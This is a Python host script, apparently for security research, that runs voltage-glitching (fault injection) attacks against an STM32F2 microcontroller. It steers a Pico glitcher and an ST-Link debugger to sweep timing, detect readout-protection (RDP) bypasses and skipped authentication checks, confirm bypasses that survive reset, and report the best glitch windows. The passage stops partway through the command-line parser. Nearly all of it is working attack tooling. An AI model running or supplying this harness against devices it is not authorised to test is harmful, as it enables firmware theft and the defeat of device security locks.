#!/usr/bin/env python3
"""
glitch_host.py - STM32F2 Semantic Bypass Detection v4.1
Features: Multi-pattern RDP check, persistence verification, timing sync, safety limits
"""

import serial
import socket
import time
import subprocess
import threading
import queue
import csv
import re
import sys
import struct
from datetime import datetime
from typing import Tuple, Optional, List, Dict
import matplotlib.pyplot as plt
import matplotlib.animation as animation
from collections import deque
import argparse
import shutil
from pathlib import Path

try:
    from serial.tools import list_ports
    LIST_PORTS_AVAILABLE = True
except Exception:
    LIST_PORTS_AVAILABLE = False

# Optional pandas for analysis
try:
    import pandas as pd
    PANDAS_AVAILABLE = True
except ImportError:
    PANDAS_AVAILABLE = False

# =============================================================================
# Target Configuration
# =============================================================================

EXPECTED_PC_MIN = 0x08000000
EXPECTED_PC_MAX = 0x08020000
VECTOR_TABLE_BASE = 0x08000000
AUTH_CHECK_ADDR = None
AUTH_PASS_ADDR = None

ADAPTER_SLOW_KHZ = 100
ADAPTER_FAST_KHZ = 1800
PC_JUMP_THRESHOLD = 0x20
DELAYED_SAMPLE_MS = 20

# RDP Detection test matrix
FLASH_TEST_ADDRESSES = [
    0x08000000,  # Vector table
    0x08000100,  # Early code
    0x08001000,  # Likely main code
    0x08004000,  # Mid-flash
    0x0800FFF0,  # Near sector end
]

# =============================================================================
# ST-Link Controller
# =============================================================================

class STLinkController:
    def __init__(self, telnet_port: int = 4444, openocd_cmd: Optional[List[str]] = None):
        self.telnet_port = telnet_port
        self.openocd_cmd = openocd_cmd or [
            "openocd", "-f", "interface/stlink.cfg", "-f", "target/stm32f2x.cfg"
        ]
        self.proc: Optional[subprocess.Popen] = None
        self.sock: Optional[socket.socket] = None
        self._lock = threading.Lock()
        self.hardfault_addr: Optional[int] = None
        self._start_openocd()
        
    def _start_openocd(self):
        print("[ST-Link] Starting OpenOCD...")
        try:
            self.proc = subprocess.Popen(
                self.openocd_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
            )
            time.sleep(1.5)
            self._connect_telnet()
            self._init_debug_settings()
            self.hardfault_addr = self._read_vector(3)
            if self.hardfault_addr:
                print(f"[ST-Link] HardFault vector: 0x{self.hardfault_addr:08x}")
            print("[ST-Link] Connected")
        except Exception as e:
            print(f"[ST-Link] Fatal: {e}")
            raise
    
    def _connect_telnet(self):
        self.sock = socket.create_connection(("localhost", self.telnet_port), timeout=5.0)
        time.sleep(0.1)
        self.sock.recv(1024)
    
    def _init_debug_settings(self):
        self.cmd("arm semihosting disable")
        self.cmd("gdb_breakpoint_override hard")
        self.cmd("cortex_m vector_catch hardfault busfault usage fault memfault")
        self.cmd("reset_config srst_only srst_nogate connect_deassert_srst")
        self.cmd("init")
        self.cmd("reset init")
        self.cmd(f"adapter speed {ADAPTER_FAST_KHZ}")
    
    def _read_vector(self, index: int) -> Optional[int]:
        addr = VECTOR_TABLE_BASE + (index * 4)
        out = self.cmd(f"mdw 0x{addr:08x} 1")
        lines = out.strip().split('\n')
        for line in lines:
            if ':' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    val_str = parts[1].strip().split()[0]
                    try:
                        return int(val_str, 16)
                    except:
                        pass
        return None
    
    def set_adapter_speed(self, khz: int):
        self.cmd(f"adapter speed {khz}")
    
    def cmd(self, command: str, timeout: float = 0.5) -> str:
        with self._lock:
            if not self.sock:
                return ""
            try:
                self.sock.send((command + "\n").encode())
                time.sleep(0.05)
                self.sock.settimeout(timeout)
                return self.sock.recv(4096).decode(errors="ignore")
            except:
                return ""
    
    def reset_target(self, run: bool = True):
        mode = "run" if run else "halt"
        self.cmd(f"reset {mode}")
        time.sleep(0.03)
    
    def get_state(self) -> str:
        out = self.cmd("targets")
        if "halted" in out.lower():
            return "halted"
        elif "running" in out.lower():
            return "running"
        return "unknown"
    
    def read_pc(self) -> Optional[int]:
        out = self.cmd("reg pc")
        match = re.search(r'0x([0-9a-fA-F]+)', out)
        if match:
            return int(match.group(1), 16)
        return None
    
    def read_memory_word(self, addr: int) -> Optional[int]:
        out = self.cmd(f"mdw 0x{addr:08x} 1")
        match = re.search(r':\s*([0-9a-fA-F]+)', out)
        if match:
            return int(match.group(1), 16)
        return None
    
    def set_hw_bp(self, addr: int):
        self.cmd(f"bp 0x{addr:08x} 2 hw")
    
    def clear_bps(self):
        self.cmd("rbp all")
    
    def read_fault_regs(self) -> Dict[str, int]:
        regs = {}
        for reg in ["cfsr", "hfsr", "mmfar", "bfar"]:
            out = self.cmd(f"reg {reg}")
            match = re.search(r'0x([0-9a-fA-F]+)', out)
            regs[reg] = int(match.group(1), 16) if match else 0
        return regs
    
    def restart_connection(self):
        print("[ST-Link] Recovery...")
        self.close()
        time.sleep(0.5)
        subprocess.run(["pkill", "-f", "openocd"], capture_output=True)
        time.sleep(0.5)
        try:
            self.proc = subprocess.Popen(
                self.openocd_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
            )
            time.sleep(2.0)
            self._connect_telnet()
            self.cmd(f"adapter speed {ADAPTER_SLOW_KHZ}")
            self.cmd("reset_config srst_only srst_nogate")
            self.cmd("init")
            self.cmd("reset halt")
            time.sleep(0.1)
            self.cmd(f"adapter speed {ADAPTER_FAST_KHZ}")
            self.hardfault_addr = self._read_vector(3)
            print("[ST-Link] Recovered")
        except Exception as e:
            print(f"[ST-Link] Recovery failed: {e}")
            raise
    
    def close(self):
        if self.sock:
            try:
                self.sock.send(b"exit\n")
                self.sock.close()
            except:
                pass
            self.sock = None
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=2)
            except:
                self.proc.kill()
            self.proc = None


# =============================================================================
# Fault Analysis
# =============================================================================

def decode_cfsr(cfsr: int) -> str:
    flags = []
    if cfsr & (1 << 0): flags.append("IACCVIOL")
    if cfsr & (1 << 1): flags.append("DACCVIOL")
    if cfsr & (1 << 7): flags.append("MMARVALID")
    if cfsr & (1 << 8): flags.append("IBUSERR")
    if cfsr & (1 << 9): flags.append("PRECISERR")
    if cfsr & (1 << 10): flags.append("IMPRECISERR")
    if cfsr & (1 << 15): flags.append("BFARVALID")
    if cfsr & (1 << 16): flags.append("UNDEFINSTR")
    if cfsr & (1 << 17): flags.append("INVSTATE")
    if cfsr & (1 << 18): flags.append("INVPC")
    if cfsr & (1 << 24): flags.append("UNALIGNED")
    return "|".join(flags) if flags else "NONE"


# =============================================================================
# Pico Interface
# =============================================================================

class GlitcherInterface:
    FRAME_START = bytes([0xAA, 0x55])
    CMD_STATUS = 0x01
    CMD_ARM = 0x02
    CMD_GLITCH = 0x03
    CMD_STRESS = 0x04
    CMD_RESET = 0x05

    RSP_STATUS = 0x81
    RSP_GLITCH_DONE = 0x82
    RSP_ERROR = 0x83
    RSP_ACK = 0x84

    def __init__(self, port: str = "/dev/ttyACM0", baud: int = 115200, pulse_ns: int = 200):
        self.port = port
        self.pulse_ns = pulse_ns
        self.ser = serial.Serial(port, baud, timeout=0.2)
        time.sleep(0.1)
        self.ser.reset_input_buffer()
        self.rx_buffer = bytearray()
        self.min_delay_ns = 100
        self.max_delay_ns = 2000
        self.current_delay_ns = self.min_delay_ns

    @staticmethod
    def _crc8(data: bytes) -> int:
        crc = 0x00
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 0x80:
                    crc = ((crc << 1) ^ 0x07) & 0xFF
                else:
                    crc = (crc << 1) & 0xFF
        return crc

    def _send_frame(self, cmd: int, payload: bytes = b""):
        msg = bytes([cmd]) + payload
        crc = self._crc8(msg)
        frame = self.FRAME_START + bytes([len(msg)]) + msg + bytes([crc])
        self.ser.write(frame)

    def _read_frame(self, timeout: float = 0.5) -> Optional[Tuple[int, bytes]]:
        deadline = time.time() + timeout
        while time.time() < deadline:
            data = self.ser.read(128)
            if data:
                self.rx_buffer.extend(data)
            while len(self.rx_buffer) >= 4:
                idx = self.rx_buffer.find(self.FRAME_START)
                if idx == -1:
                    self.rx_buffer = bytearray()
                    break
                if idx > 0:
                    self.rx_buffer = self.rx_buffer[idx:]
                if len(self.rx_buffer) < 4:
                    break
                length = self.rx_buffer[2]
                total_len = 2 + 1 + 1 + length + 1
                if len(self.rx_buffer) < total_len:
                    break
                frame = self.rx_buffer[:total_len]
                self.rx_buffer = self.rx_buffer[total_len:]
                msg = frame[3 : 3 + length]
                rx_crc = frame[3 + length]
                if self._crc8(msg) != rx_crc or not msg:
                    continue
                cmd = msg[0]
                payload = msg[1:]
                return cmd, payload
            time.sleep(0.01)
        return None

    def _arm(self, delay_ns: int, pulse_ns: int) -> bool:
        payload = struct.pack("<HH", delay_ns, pulse_ns)
        self._send_frame(self.CMD_ARM, payload)
        response = self._read_frame()
        return bool(response and response[0] == self.RSP_ACK)

    def _glitch(self) -> Optional[dict]:
        self._send_frame(self.CMD_GLITCH)
        response = self._read_frame(timeout=1.2)
        if not response:
            return None
        cmd, payload = response
        if cmd == self.RSP_GLITCH_DONE and len(payload) >= 10:
            _, _, pre_vcap, post_vcap, droop = struct.unpack("<HHhhh", payload[:10])
            return {
                "pre_vcap": pre_vcap,
                "post_vcap": post_vcap,
                "droop": droop,
            }
        return None

    def init_optimizer(self, min_d: int = 100, max_d: int = 2000) -> str:
        self.min_delay_ns = min_d
        self.max_delay_ns = max_d
        self.current_delay_ns = min_d
        return f"OPTINIT d:{min_d}-{max_d}"

    def step(self) -> Optional[Tuple[int, float, float, bool]]:
        delay_ns = self.current_delay_ns
        self.current_delay_ns += 1
        if self.current_delay_ns > self.max_delay_ns:
            self.current_delay_ns = self.min_delay_ns

        armed = self._arm(delay_ns, self.pulse_ns)
        if not armed:
            return None

        result = self._glitch()
        if not result:
            return None

        pre_vcap = max(result["pre_vcap"], 1)
        droop = max(result["droop"], 0)
        score = min((droop / pre_vcap) * 100.0, 100.0)
        # stress is currently not driven by this host implementation
        return (delay_ns, score, 0.0, True)

    def close(self):
        self.ser.close()


# =============================================================================
# Data Logging
# =============================================================================

class DataLogger:
    def __init__(self, filename: Optional[str] = None):
        if filename is None:
            filename = f"glitch_v4_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        self.file = open(filename, 'w', newline='')
        self.writer = csv.writer(self.file)
        self.writer.writerow([
            'timestamp', 'step', 'delay_ns', 'droop_score', 'stress', 'ack',
            'cpu_state', 'pc_hex', 'classification', 'semantic_result',
            'vector_corrupt', 'persistent_bypass', 'fault_flags', 'mmfar', 'bfar', 'success'
        ])
        self.file.flush()
        self.filename = filename
        
    def log(self, data: list):
        self.writer.writerow(data)
        self.file.flush()
        
    def close(self):
        self.file.close()


# =============================================================================
# Live Plotter
# =============================================================================

class LivePlotter(threading.Thread):
    def __init__(self, data_queue: queue.Queue, max_points: int = 400):
        super().__init__(daemon=True)
        self.q = data_queue
        self.max_points = max_points
        self.delays = deque(maxlen=max_points)
        self.scores = deque(maxlen=max_points)
        self.colors = deque(maxlen=max_points)
        self.sizes = deque(maxlen=max_points)
        
        self.fig, self.ax = plt.subplots(figsize=(14, 8))
        self.scatter = self.ax.scatter([], [], c=[], s=[], cmap='viridis', 
                                       vmin=0, vmax=3, alpha=0.8, 
                                       edgecolors='black', linewidths=0.5)
        self.ax.set_xlabel('Glitch Delay (ns)', fontsize=12)
        self.ax.set_ylabel('Droop Score (%)', fontsize=12)
        self.ax.set_title('STM32F2 Security Bypass Detection\n'
                         'Green=Miss | Red=Crash | Purple=Bypass/Exploit | Blue=Unknown\n'
                         '🔥 Large markers = Persistent bypass confirmed', fontsize=11)
        self.ax.grid(True, alpha=0.3)
        
        from matplotlib.patches import Patch
        legend_elements = [
            Patch(facecolor='green', alpha=0.6, label='Normal'),
            Patch(facecolor='red', alpha=0.6, label='Crash/HardFault'),
            Patch(facecolor='purple', alpha=0.6, label='Security Bypass'),
            Patch(facecolor='blue', alpha=0.6, label='Unknown')
        ]
        self.ax.legend(handles=legend_elements, loc='upper right', fontsize=9)
        
    def run(self):
        ani = animation.FuncAnimation(self.fig, self._update, interval=100, blit=False)
        plt.show()
        
    def _class_to_color(self, cls: str) -> int:
        mapping = {
            'normal': 0, 'hardfault_trap': 1, 'crash': 1,
            'control_flow_fault': 2, 'semantic_bypass': 2,
            'vector_corruption': 2, 'auth_skip': 2, 'unknown': 3
        }
        return mapping.get(cls, 3)
        
    def _update(self, frame):
        changed = False
        while not self.q.empty():
            try:
                delay, score, classification, success = self.q.get_nowait()
                self.delays.append(delay)
                self.scores.append(score)
                self.colors.append(self._class_to_color(classification))
                self.sizes.append(120 if success else 50)
                changed = True
            except queue.Empty:
                break
                
        if changed and len(self.delays) > 0:
            self.scatter.set_offsets(list(zip(self.delays, self.scores)))
            self.scatter.set_array([self.colors])
            self.scatter.set_sizes([self.sizes])
            
            if len(self.delays) > 1:
                x_margin = max((max(self.delays) - min(self.delays)) * 0.1, 100)
                y_margin = max((max(self.scores) - min(self.scores)) * 0.1, 10)
                self.ax.set_xlim(min(self.delays)-x_margin, max(self.delays)+x_margin)
                self.ax.set_ylim(min(self.scores)-y_margin, max(self.scores)+y_margin)
        return [self.scatter]


# =============================================================================
# Main Controller (Hardened Edition)
# =============================================================================

class GlitchExperiment:
    def __init__(
        self,
        glitch_port: str,
        stlink_auto: bool = True,
        log_path: Optional[str] = None,
        enable_plot: bool = True,
        quiet: bool = False,
        print_every: int = 1,
    ):
        print("[Init] Connecting to hardware...")
        self.glitcher = GlitcherInterface(glitch_port)
        self.debugger = STLinkController() if stlink_auto else None
        self.logger = DataLogger(log_path)

        # UX controls (do not affect experiment logic)
        self.quiet = quiet
        self.print_every = max(1, int(print_every))

        # Plotting is optional for headless/CI use
        self.plot_q = queue.Queue() if enable_plot else None
        self.plotter = LivePlotter(self.plot_q) if enable_plot else None
        if self.plotter:
            self.plotter.start()
        
        self.step_count = 0
        self.consecutive_unknowns = 0
        self.last_pc: Optional[int] = None
        
        # Safety limits
        self.consecutive_lockups = 0
        self.max_lockups = 5
        
        # Statistics
        self.stats = {k: 0 for k in ['normal', 'hardfault_trap', 'crash', 
                                     'control_flow_fault', 'semantic_bypass',
                                     'vector_corruption', 'auth_skip', 'unknown', 'success']}
        
        # Persistent bypass tracking
        self.persistent_bypass_detected = False
    
    def check_semantic_bypass(self) -> Optional[str]:
        """
        Enhanced RDP bypass detection with multiple test patterns.
        Checks for valid Thumb code patterns across multiple addresses.
        """
        if not self.debugger:
            return None
        
        patterns = []
        
        for addr in FLASH_TEST_ADDRESSES:
            word = self.debugger.read_memory_word(addr)
            if word is None:
                continue
            
            # Protected flash patterns (RDP1/RDP2 behavior)
            is_protected = (
                word == 0xFFFFFFFF or 
                word == 0x00000000 or
                word == 0xFFFF0000 or
                word == 0x0000FFFF or
                word == 0xAAAAAAAA or
                word == 0x55555555 or
                (word & 0xFFFF0000) == 0xFFFF0000 or  # Half-protected
                (word & 0x0000FFFF) == 0x0000FFFF
            )
            
            if not is_protected:
                # Heuristic: Check if it looks like valid Thumb code
                # Thumb instructions typically have specific bit patterns in upper bits
                halfword1 = word & 0xFFFF
                halfword2 = (word >> 16) & 0xFFFF
                
                # Common Thumb instruction signatures (BL, B, MOV, LDR, STR, etc.)
                valid_thumb = (
                    (0xD000 <= halfword1 <= 0xEFFF) or  # B/BL range
                    (0x4000 <= halfword1 <= 0x7FFF) or  # Data processing
                    (0x6000 <= halfword1 <= 0x7FFF) or  # STR/LDR
                    (0x2000 <= halfword1 <= 0x3FFF)     # MOV/CMP immediate
                )
                
                if valid_thumb:
                    patterns.append((addr, word))
        
        # Multiple valid reads = high confidence bypass
        if len(patterns) >= 2:
            print(f"[RDP Bypass] Flash readable at: {patterns[:3]}")  # Limit output
            return "flash_readable_when_locked"
        
        return None

    @staticmethod
    def _is_vector_suspicious(vector_value: int) -> bool:
        """Return True if vector looks corrupted (non-flash or non-Thumb aligned)."""
        if not vector_value:
            return True
        if not (EXPECTED_PC_MIN <= vector_value <= EXPECTED_PC_MAX):
            return True
        if vector_value & 0x1 == 0:
            return True
        return False
    
    def verify_persistent_bypass(self) -> bool:
        """
        Verify if bypass survives reset (indicates option byte corruption 
        or persistent RDP downgrade, not just transient bus glitch).
        """
        if not self.debugger:
            return False
        
        # Read before reset
        test_val = self.debugger.read_memory_word(0x08000000)
        
        # Reset and wait for boot
        self.debugger.reset_target(run=True)
        time.sleep(0.05)  # Wait for BootROM
        
        # Read after reset
        post_val = self.debugger.read_memory_word(0x08000000)
        
        # Both readable and consistent = persistent
        if (test_val is not None and post_val is not None and 
            test_val == post_val and
            test_val not in (0xFFFFFFFF, 0x00000000)):
            print(f"[Persistent] Bypass survives reset! 0x{test_val:08x}")
            return True
        
        return False

    def verify_vector_persistence(self) -> bool:
        """Check if vector remains suspicious after a reset."""
        if not self.debugger:
            return False
        self.debugger.reset_target(run=True)
        time.sleep(0.05)
        post_reset_vector = self.debugger._read_vector(1)
        if post_reset_vector and self._is_vector_suspicious(post_reset_vector):
            print(f"[Persistent] Vector remains suspicious: 0x{post_reset_vector:08x}")
            return True
        return False
    
    def run(self, steps: int = 500, delay_between: float = 0.05):
        # Always init optimizer; optionally suppress banner output
        opt_banner = self.glitcher.init_optimizer()
        if not self.quiet:
            print(opt_banner)
            print(f"\n[Config] PC Window: 0x{EXPECTED_PC_MIN:08x}-0x{EXPECTED_PC_MAX:08x}")
            print(f"[Safety] Max lockups before abort: {self.max_lockups}")
            print("Step  | Delay(ns) | Score  | Classification      | Result                | Persist | Success")
            print("-" * 95)
        
        try:
            for i in range(steps):
                self.step_count = i
                semantic_result = None
                vector_corrupt = False
                persistent = False
                
                if not self.debugger:
                    self._run_blind(i, delay_between)
                    continue
                
                # 1. Reset and baseline
                self.debugger.reset_target(run=True)
                time.sleep(0.01)
                self.last_pc = None
                baseline_vector = self.debugger._read_vector(1)
                
                if AUTH_CHECK_ADDR and AUTH_PASS_ADDR:
                    self.debugger.clear_bps()
                    self.debugger.set_hw_bp(AUTH_CHECK_ADDR)
                    self.debugger.set_hw_bp(AUTH_PASS_ADDR)
                
                # 2. Timing synchronization - slow SWD for glitch window
                self.debugger.set_adapter_speed(ADAPTER_SLOW_KHZ)
                
                # 3. Trigger glitch with precise timing
                start_time = time.perf_counter()
                parsed = self.glitcher.step()

                if not parsed:
                    self.debugger.set_adapter_speed(ADAPTER_FAST_KHZ)
                    print(f"{i:04d} | PARSE_ERROR")
                    continue
                    
                delay, score, stress, ack = parsed
                
                # 4. Restore speed and synchronize
                sample_delay = DELAYED_SAMPLE_MS / 1000.0
                elapsed = time.perf_counter() - start_time
                if elapsed < sample_delay:
                    time.sleep(sample_delay - elapsed)
                
                self.debugger.set_adapter_speed(ADAPTER_FAST_KHZ)
                time.sleep(delay_between)
                
                # 5. State analysis
                state = self.debugger.get_state()
                pc = self.debugger.read_pc()
                
                # Recovery handling with abort logic
                if state == "unknown":
                    self.consecutive_unknowns += 1
                    if self.consecutive_unknowns >= 3:
                        self.consecutive_lockups += 1
                        self.consecutive_unknowns = 0
                        print(f"[Safety] Lockup {self.consecutive_lockups}/{self.max_lockups}")
                        
                        if self.consecutive_lockups >= self.max_lockups:
                            print("⚠️  TOO MANY LOCKUPS - ABORTING FOR SAFETY")
                            break
                        self.debugger.restart_connection()
                else:
                    self.consecutive_unknowns = 0
                    if self.consecutive_lockups > 0:
                        self.consecutive_lockups = max(0, self.consecutive_lockups - 1)
                
                # 6. Vector corruption check
                post_vector = self.debugger._read_vector(1)
                if baseline_vector and post_vector and baseline_vector != post_vector:
                    if self._is_vector_suspicious(post_vector):
                        vector_corrupt = True
                        semantic_result = "vector_table_corrupted"
                        if self.verify_vector_persistence():
                            persistent = True
                
                # 7. PC discontinuity
                pc_jump = False
                if pc and self.last_pc:
                    if abs(pc - self.last_pc) > PC_JUMP_THRESHOLD:
                        pc_jump = True
                self.last_pc = pc
                
                # 8. Semantic bypass detection
                if not semantic_result:
                    semantic_result = self.check_semantic_bypass()
                    
                    # If bypass detected, check persistence
                    if semantic_result == "flash_readable_when_locked":
                        persistent = self.verify_persistent_bypass()
                        if persistent:
                            self.persistent_bypass_detected = True
                
                # 9. Auth skip detection
                if (AUTH_CHECK_ADDR and AUTH_PASS_ADDR and 
                    state == "halted" and pc == AUTH_PASS_ADDR):
                    semantic_result = "auth_check_skipped"
                
                # 10. Classification
                classification = "unknown"
                is_hardfault = False
                
                if semantic_result == "flash_readable_when_locked":
                    classification = "semantic_bypass"
                elif semantic_result == "vector_table_corrupted":
                    classification = "vector_corruption"
                elif semantic_result == "auth_check_skipped":
                    classification = "auth_skip"
                elif vector_corrupt:
                    classification = "vector_corruption"
                elif state == "halted":
                    if pc == self.debugger.hardfault_addr:
                        classification = "hardfault_trap"
                        is_hardfault = True
                    else:
                        classification = "crash"
                elif state == "running":
                    pc_in_range = EXPECTED_PC_MIN <= pc <= EXPECTED_PC_MAX if pc else False
                    if not pc_in_range or pc_jump:
                        classification = "control_flow_fault"
                    else:
                        classification = "normal"
                
                # 11. Success determination
                success = False
                if ack:
                    if classification in ["semantic_bypass", "auth_skip"]:
                        success = True
                    elif classification == "vector_corruption" and persistent:
                        success = True  # Persistent vector corruption is serious
                    elif classification == "control_flow_fault" and pc_jump:
                        success = True
                    elif classification in ["hardfault_trap", "crash"]:
                        faults = self.debugger.read_fault_regs()
                        if "PRECISERR" in decode_cfsr(faults.get("cfsr", 0)):
                            success = True
                
                # 12. Fault details
                fault_flags = "N/A"
                mmfar = bfar = 0
                if state == "halted":
                    faults = self.debugger.read_fault_regs()
                    cfsr = faults.get("cfsr", 0)
                    mmfar = faults.get("mmfar", 0)
                    bfar = faults.get("bfar", 0)
                    fault_flags = decode_cfsr(cfsr)
                
                # 13. Stats and display
                self.stats[classification] += 1
                if success:
                    self.stats['success'] += 1
                
                pc_str = f"0x{pc:08x}" if pc else "????????"
                sem_str = semantic_result or "-"
                persist_str = "YES" if persistent else ("-" if not semantic_result else "no")

                # Respect --quiet and --print-every (but always show notable events)
                notable = success or persistent or classification in ("semantic_bypass", "auth_skip", "vector_corruption")
                if (not self.quiet) and (notable or (i % self.print_every == 0)):
                    print(f"{i:04d} | {delay:9d} | {score:6.1f} | {classification:19s} | "
                          f"{sem_str:21s} | {persist_str:7s} | {'✓' if success else ' '}")
                
                # 14. Log
                self.logger.log([
                    time.time(), i, delay, score, stress, int(ack), state,
                    pc_str, classification, semantic_result or "",
                    int(vector_corrupt), int(persistent), fault_flags,
                    f"0x{mmfar:08x}", f"0x{bfar:08x}", int(success)
                ])
                
                # 15. Plot
                if self.plot_q:
                    self.plot_q.put((delay, score, classification, success))
                
        except KeyboardInterrupt:
            print("\n[Run] Interrupted by user")
        except Exception as e:
            print(f"\n[ERROR] {e}")
            raise
        finally:
            self._print_summary()
            self.shutdown()
    
    def _run_blind(self, i, delay_between):
        """Blind mode without debugger."""
        parsed = self.glitcher.step()
        if not parsed:
            print(f"{i:04d} | PARSE_ERROR")
            return
        delay, score, stress, ack = parsed
        time.sleep(delay_between)
        classification = "unknown" if not ack else "normal"
        success = False
        self.logger.log([time.time(), i, delay, score, stress, int(ack), 
                        "blind", "", classification, "", 0, 0, "N/A", "", "", int(success)])
        if self.plot_q:
            self.plot_q.put((delay, score, classification, success))
    
    def _print_summary(self):
        print("\n" + "="*70)
        print("SECURITY BYPASS DETECTION SUMMARY")
        print("="*70)
        total = self.step_count + 1
        
        for k, v in sorted(self.stats.items(), key=lambda x: -x[1]):
            if v == 0:
                continue
            pct = (v/total)*100
            marker = ""
            if k == "success" and v > 0:
                marker = "🎯"
            elif k == "semantic_bypass":
                marker = "🔓🔓🔓 RDP BYPASS"
            elif k == "auth_skip":
                marker = "🔐 AUTH SKIP"
            elif k == "vector_corruption":
                marker = "⚡"
            print(f"{k:20s}: {v:4d} ({pct:5.1f}%) {marker}")
        
        if self.persistent_bypass_detected:
            print("\n🚨 PERSISTENT BYPASS DETECTED - Device may be permanently unlocked!")
        
        print(f"\n📁 CSV saved: {self.logger.filename}")
        print("💡 Analysis commands:")
        print(f"   Bypasses:     awk -F',' '$16==1' {self.logger.filename}")
        print(f"   Persistent:   awk -F',' '$12==1' {self.logger.filename}")
        print(f"   Python:       python3 -c \"import pandas as pd; df=pd.read_csv('{self.logger.filename}'); print(df[df['success']==1])\"")
        print("="*70)
        
        # Auto-run analysis if pandas available
        if PANDAS_AVAILABLE and total > 10:
            self._analyze_csv()
    
    def _analyze_csv(self):
        """Quick pandas analysis."""
        try:
            df = pd.read_csv(self.logger.filename)
            print("\n📊 QUICK ANALYSIS:")
            print(f"Total: {len(df)}, Success rate: {df['success'].mean():.1%}")
            
            if df['success'].sum() > 0:
                success_df = df[df['success'] == 1]
                print(f"Optimal delay range: {success_df['delay_ns'].min()}-{success_df['delay_ns'].max()}ns")
                print(f"Mean droop in success window: {success_df['droop_score'].mean():.1f}%")
                
                bypasses = df[df['semantic_result'] != '']
                if not bypasses.empty:
                    print("\n🔓 Bypass Events:")
                    for _, row in bypasses.head(5).iterrows():
                        print(f"  Step {row['step']}: {row['semantic_result']} @ {row['delay_ns']}ns")
        except Exception as e:
            pass  # Silent fail on analysis errors
    
    def shutdown(self):
        print("[Shutdown] Closing connections...")
        self.logger.close()
        if self.debugger:
            self.debugger.close()
        self.glitcher.close()


# =============================================================================
# Standalone Analysis Tool
# =============================================================================

def analyze_csv_file(csv_file: str):
    """Standalone analysis function for post-experiment review."""
    if not PANDAS_AVAILABLE:
        print("Install pandas for analysis: pip install pandas")
        return
    
    try:
        df = pd.read_csv(csv_file)
        print(f"\n{'='*60}")
        print(f"ANALYSIS: {csv_file}")
        print(f"{'='*60}")
        print(f"Total glitches: {len(df)}")
        print(f"Success rate: {df['success'].mean():.1%}")
        
        # Classification breakdown
        print("\nBreakdown:")
        print(df['classification'].value_counts())
        
        # Bypass details
        bypasses = df[df['semantic_result'] != '']
        if not bypasses.empty:
            print(f"\n🔓 SEMANTIC BYPASSES ({len(bypasses)} found):")
            print(bypasses[['step', 'delay_ns', 'semantic_result', 'pc_hex', 'persistent_bypass']].to_string())
        
        # Optimal timing windows
        if df['success'].sum() > 0:
            success_df = df[df['success'] == 1]
            print(f"\n⏱️  OPTIMAL TIMING WINDOW:")
            print(f"Delay: {success_df['delay_ns'].min()} - {success_df['delay_ns'].max()} ns")
            print(f"Droop: {success_df['droop_score'].mean():.1f}% ± {success_df['droop_score'].std():.1f}%")
            
            # Histogram of successful delays
            print(f"\nSuccess distribution by delay:")
            bins = pd.cut(success_df['delay_ns'], bins=10)
            print(bins.value_counts().sort_index())
            
        # Persistent bypasses (the holy grail)
        persistent = df[df['persistent_bypass'] == 1]
        if not persistent.empty:
            print(f"\n🚨 PERSISTENT BYPASSES (survive reset): {len(persistent)}")
            print(persistent[['step', 'delay_ns', 'semantic_result']].to_string())
            
    except Exception as e:
        print(f"Analysis error: {e}")


# =============================================================================
# UX Helpers (CLI convenience)
# =============================================================================

def _list_ports_text() -> str:
    if not LIST_PORTS_AVAILABLE:
        return "pyserial list_ports not available"
    ports = list(list_ports.comports())
    if not ports:
        return "(no serial ports found)"
    lines = []
    for p in ports:
        desc = p.description or ""
        hwid = p.hwid or ""
        lines.append(f"{p.device:>15}  {desc}  {hwid}".rstrip())
    return "\n".join(lines)


def resolve_port(port_arg: str) -> str:
    """Resolve a user port argument, supporting '--port auto'."""
    if port_arg and port_arg.lower() != "auto":
        return port_arg
    if not LIST_PORTS_AVAILABLE:
        raise SystemExit("Port auto-detect requires pyserial 'list_ports'. Install pyserial or pass --port explicitly.")
    ports = list(list_ports.comports())
    if not ports:
        raise SystemExit("No serial ports found. Use --list-ports and pass --port explicitly.")
    # Prefer common USB CDC / ACM devices
    preferred = []
    for p in ports:
        dev = (p.device or "")
        if "ACM" in dev or "USB" in dev:
            preferred.append(p)
    return (preferred[0] if preferred else ports[0]).device


def make_output_path(out: Optional[str], out_dir: Optional[str], tag: Optional[str]) -> Optional[str]:
    """Compute CSV output path. If 'out' is provided, it wins."""
    if out:
        return out
    if not out_dir and not tag:
        return None  # fall back to DataLogger auto timestamp
    out_dir = out_dir or "."
    safe_tag = ""
    if tag:
        safe_tag = re.sub(r"[^A-Za-z0-9._-]+", "_", tag).strip("_")
        safe_tag = f"_{safe_tag}" if safe_tag else ""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    Path(out_dir).mkdir(parents=True, exist_ok=True)
    return str(Path(out_dir) / f"crowbar{safe_tag}_{ts}.csv")


def doctor_cmd(port: str) -> int:
    """Basic environment checks for ease-of-use."""
    ok = True
    print("Crowbar doctor checks")
    print("-" * 60)

    if shutil.which("openocd") is None:
        print("✗ openocd not found on PATH")
        ok = False
    else:
        print("✓ openocd found")

    if LIST_PORTS_AVAILABLE:
        print("\nSerial ports:")
        print(_list_ports_text())
    else:
        print("\n• serial port listing unavailable (missing pyserial list_ports)")

    # Attempt to open the requested port
    try:
        resolved = resolve_port(port)
        s = serial.Serial(resolved, 115200, timeout=0.5)
        s.close()
        print(f"\n✓ serial open OK: {resolved}")
    except Exception as e:
        print(f"\n✗ serial open failed ({port}): {e}")
        print("  Tip: on Linux you may need to add your user to the 'dialout' group.")
        ok = False

    print("-" * 60)
    return 0 if ok else 2


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Crowbar - STM32F2 semantic bypass detection")
    p.add_argument("--list-ports", action="store_true", help="List serial ports and exit")

    sub = p.add_subparsers(dest="cmd")

    run = sub.add_parser("run", help="Run an experiment")
    run.add_argument("--port", default="auto", help="Glitcher serial port (or 'auto')")
    run.add_argument("--steps", type=int, default=500, help="Iterations")
    run.add_argument("--no-debug", action="store_true", help="Blind mode (no ST-Link)")
    run.add_argument("--pc-min", type=lambda x: int(x, 0), default=EXPECTED_PC_MIN)
    run.add_argument("--pc-max", type=lambda x: int(x, 0), default=EXPECTED_PC_MAX)
